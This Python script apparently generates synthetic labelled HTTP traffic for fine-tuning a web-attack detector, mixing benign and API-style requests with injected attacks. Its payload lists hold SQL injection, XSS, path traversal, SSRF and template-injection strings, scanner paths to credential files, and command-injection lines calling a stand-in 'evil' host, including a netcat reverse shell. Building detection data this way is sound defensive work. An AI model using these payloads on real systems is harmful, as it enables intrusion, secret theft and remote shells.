"""
Generator of a synthetic labelled corpus for FINE-TUNING on top of the expert
model. It combines normal-traffic templates with attack payload sets, placing them
in different request parts (path, query, body) with variations (encoding,
case, padding) so the model generalises rather than memorises.

Usage:
    python3 synth.py --n 40000 --out synth.jsonl
Mixing in public datasets (CSIC-2010, FWAF, PayloadsAllTheThings) is recommended;
see load_external() and the README.
"""
from __future__ import annotations
import argparse
import json
import random
import urllib.parse

# ---------- normal traffic ----------
BENIGN_PATHS = [
    "/", "/index.html", "/about", "/contact", "/products", "/search", "/cart",
    "/login", "/logout", "/profile", "/settings", "/blog", "/news", "/docs",
    "/api/v1/users", "/api/v1/orders", "/api/v2/products", "/checkout",
    "/images/{w}.png", "/static/js/{w}.js", "/static/css/{w}.css",
    "/blog/{y}/{m}/{w}", "/category/{w}", "/user/{n}", "/article/{n}-{w}",
]
BENIGN_PARAMS = [
    "page", "limit", "offset", "sort", "order", "q", "query", "category", "tag",
    "id", "page_size", "per_page", "lang", "color", "size", "brand", "min_price",
    "max_price", "since", "until", "format", "tab", "ref", "utm_source",
]
BENIGN_WORDS = [
    "shoes", "laptop", "phone", "book", "table", "blue", "small", "large",
    "technology", "science", "hello-world", "getting-started", "summary",
    "dashboard", "profile", "report", "invoice", "settings", "overview",
]
BENIGN_VALUES = [
    "1", "2", "10", "20", "50", "100", "true", "false", "asc", "desc", "json",
    "2024", "price", "name", "newest", "popular", "en", "ru", "dark", "light",
]

# ---------- modern API normal traffic: high entropy but LEGITIMATE ----------
# Rationale: without this the model learns 'high entropy or special characters means attack' and
# produces false positives on real API traffic (hex session ids, ISO timestamps, filter[...] parameters,
# JSON bodies). We generate this NORMAL traffic explicitly so the model learns the boundary.
_HEX = "0123456789abcdef"
_B64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"

def _hexhash(r, n=32): return "".join(r.choice(_HEX) for _ in range(n))
def _uuid(r):
    h = _hexhash(r, 32)
    return f"{h[:8]}-{h[8:12]}-{h[12:16]}-{h[16:20]}-{h[20:]}"
def _b64(r, n=24): return "".join(r.choice(_B64) for _ in range(n))
def _isots(r):
    return (f"{r.randint(2023,2026):04d}-{r.randint(1,12):02d}-{r.randint(1,28):02d}"
            f"T{r.randint(0,23):02d}:{r.randint(0,59):02d}:{r.randint(0,59):02d}"
            f"+0{r.randint(0,9)}:00")
def _jwt(r):
    return f"{_b64(r,20)}.{_b64(r,40)}.{_b64(r,43)}"

API_PATHS = [
    "/api/v2/sync", "/rest/user.get", "/graphql", "/services/main/ajax.php",
    "/bitrix/services/main/ajax.php", "/api/session/refresh", "/api/v1/messages",
    "/wp-json/wp/v2/posts", "/api/orders/list", "/api/analytics/events", "/api/v2/im.sync",
]
API_ACTIONS = [
    "im.v2.Sync.list", "user.get", "order.list", "message.send", "sync.pull",
    "profile.update", "feed.get", "notify.counters", "catalog.product.list",
]
BRACKET_PARAMS = [
    "filter[lastDate]", "filter[status]", "filter[id]", "filter[since]", "sort[date]",
    "sort[]", "fields[]", "include[]", "page[number]", "page[size]", "data[type]",
]

def gen_benign_api(r: random.Random) -> dict:
    """A legitimate modern API request: high-entropy but NOT malicious values."""
    p = r.choice(API_PATHS)
    parts = []
    if r.random() < 0.6:
        parts.append("action=" + r.choice(API_ACTIONS))
    for _ in range(r.randint(1, 3)):
        bp = r.choice(BRACKET_PARAMS)
        v = r.choice([_isots(r), str(r.randint(1, 100000)),
                      r.choice(BENIGN_VALUES), r.choice(BENIGN_WORDS), _hexhash(r, 8)])
        parts.append(f"{urllib.parse.quote(bp)}={urllib.parse.quote(v)}")
    if r.random() < 0.7: parts.append("sessid=" + _hexhash(r))
    if r.random() < 0.4: parts.append("limit=" + str(r.choice([50, 100, 200, 500, 1000])))
    if r.random() < 0.3: parts.append("token=" + _b64(r, r.randint(20, 40)))
    if r.random() < 0.2: parts.append("uuid=" + _uuid(r))
    query = "&".join(parts)
    body = ""
    if r.random() < 0.45:
        body = json.dumps({
            "sessid": _hexhash(r), "ts": _isots(r),
            "filter": {"status": r.choice(["active", "done", "new"]), "since": _isots(r)},
            "limit": r.choice([100, 500]),
        }, ensure_ascii=False)
    return {"path": p, "query": query, "body": body, "label": 0}

# ---------- attacks: payload sets by vector ----------
SQLI = [
    "1' OR '1'='1", "1 OR 1=1", "admin'--", "1' UNION SELECT NULL--",
    "1 UNION SELECT username,password FROM users", "1'; DROP TABLE users--",
    "1' AND SLEEP(5)--", "1' WAITFOR DELAY '0:0:5'--", "' OR 1=1#",
    "1 UNION ALL SELECT version(),database()--", "1' AND 1=CONVERT(int,@@version)--",
    "1) OR (1=1", "1' OR 'a'='a", "1 AND extractvalue(1,concat(0x7e,version()))",
    "1' UNION SELECT table_name FROM information_schema.tables--",
    "1' OR SLEEP(5) AND 'x'='x", "1; EXEC xp_cmdshell('dir')--",
]
XSS = [
    "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(document.cookie)>", "javascript:alert(1)",
    "<iframe src=javascript:alert(1)>", "<body onload=alert(1)>",
    "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
    "<a href=javascript:eval(atob('...'))>x</a>", "<input onfocus=alert(1) autofocus>",
    "<details open ontoggle=alert(1)>", "<marquee onstart=alert(1)>",
    "<img src=1 href=1 onerror=javascript:alert(1)>",
]
LFI = [
    "../../../../etc/passwd", "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd", "/etc/passwd%00",
    "php://filter/convert.base64-encode/resource=config",
    "../../../proc/self/environ", "..\\..\\..\\windows\\win.ini",
    "file:///etc/shadow", "....\\\\....\\\\boot.ini", "/var/log/apache2/access.log",
]
CMDI = [
    "127.0.0.1;cat /etc/passwd", "8.8.8.8 && id", "$(whoami)", "`id`",
    "|cat /etc/passwd", "; ls -la", "&& curl http://evil/x", "; wget http://evil/x",
    "$(curl evil)", "${jndi:ldap://evil/a}", "|nc -e /bin/sh evil 4444",
    "test;/bin/bash -i", "x|sh",
]
SSRF = [
    "http://169.254.169.254/latest/meta-data/", "http://localhost:6379/",
    "http://127.0.0.1:8080/admin", "http://metadata.google.internal/",
    "gopher://127.0.0.1:25/", "dict://127.0.0.1:11211/", "file:///etc/passwd",
]
SSTI = ["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{{config.items()}}", "${T(java.lang.Runtime)}"]
PAYLOADS = {
    "sqli": SQLI, "xss": XSS, "lfi": LFI, "cmdi": CMDI, "ssrf": SSRF, "ssti": SSTI,
}
SCANNER_PATHS = [
    "/.env", "/.git/config", "/.git/HEAD", "/wp-admin/", "/wp-login.php",
    "/phpmyadmin/", "/.aws/credentials", "/.ssh/id_rsa", "/actuator/env",
    "/server-status", "/.svn/entries", "/config.php.bak",
]


def _rword(r): return r.choice(BENIGN_WORDS)


def gen_benign(r: random.Random) -> dict:
    # about 35% of the normal traffic is modern API traffic (high entropy but legitimate), teaching the model
    # not to confuse hex sessions, ISO timestamps and filter[...] with attack obfuscation.
    if r.random() < 0.35:
        return gen_benign_api(r)
    p = r.choice(BENIGN_PATHS)
    p = p.replace("{w}", _rword(r)).replace("{n}", str(r.randint(1, 99999))) \
         .replace("{y}", str(r.randint(2018, 2024))).replace("{m}", f"{r.randint(1,12):02d}")
    query = ""
    body = ""
    if r.random() < 0.6:
        k = r.randint(1, 4)
        parts = []
        for _ in range(k):
            name = r.choice(BENIGN_PARAMS)
            val = r.choice(BENIGN_VALUES + BENIGN_WORDS)
            parts.append(f"{name}={urllib.parse.quote(val)}")
        query = "&".join(parts)
    if r.random() < 0.25:
        if r.random() < 0.5:
            body = json.dumps({r.choice(BENIGN_PARAMS): r.choice(BENIGN_VALUES) for _ in range(r.randint(1, 3))})
        else:
            body = "&".join(f"{r.choice(BENIGN_PARAMS)}={r.choice(BENIGN_VALUES)}" for _ in range(r.randint(1, 3)))
    return {"path": p, "query": query, "body": body, "label": 0}


def _obfuscate(s: str, r: random.Random) -> str:
    """Random variations: URL encoding, case, padding."""
    if r.random() < 0.3:
        s = urllib.parse.quote(s, safe="")
    if r.random() < 0.2:
        s = "".join(c.upper() if r.random() < 0.5 else c for c in s)
    if r.random() < 0.15:
        s = s + "&_=" + str(r.randint(1, 9999))
    return s


def gen_attack(r: random.Random) -> dict:
    vec = r.choice(list(PAYLOADS.keys()) + ["scanner"])
    base = gen_benign(r)  # a wrapper built from a normal request, with the attack injected into one part
    base["label"] = 1
    if vec == "scanner":
        base["path"] = r.choice(SCANNER_PATHS)
        base["query"] = ""
        base["body"] = ""
        return base
    payload = _obfuscate(r.choice(PAYLOADS[vec]), r)
    part = r.choices(["query", "body", "path"], weights=[0.55, 0.30, 0.15])[0]
    if part == "query":
        name = r.choice(["id", "q", "file", "page", "url", "search", "name", "cmd", "host"])
        base["query"] = f"{name}={payload}"
    elif part == "body":
        name = r.choice(["q", "data", "input", "comment", "username", "payload"])
        base["body"] = f"{name}={payload}"
    else:
        base["path"] = "/" + payload
    return base


def generate(n: int, seed: int = 1337, pos_ratio: float = 0.5):
    r = random.Random(seed)
    out = []
    for _ in range(n):
        out.append(gen_attack(r) if r.random() < pos_ratio else gen_benign(r))
    return out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--n", type=int, default=40000)
    ap.add_argument("--out", default="synth.jsonl")
    ap.add_argument("--seed", type=int, default=1337)
    ap.add_argument("--pos-ratio", type=float, default=0.5)
    a = ap.parse_args()
    data = generate(a.n, a.seed, a.pos_ratio)
    with open(a.out, "w", encoding="utf-8") as f:
        for ex in data:
            f.write(json.dumps(ex, ensure_ascii=False) + "\n")
    pos = sum(x["label"] for x in data)
    print(f"generated {len(data)} ({pos} attacks / {len(data)-pos} normal) -> {a.out}")


if __name__ == "__main__":
    main()
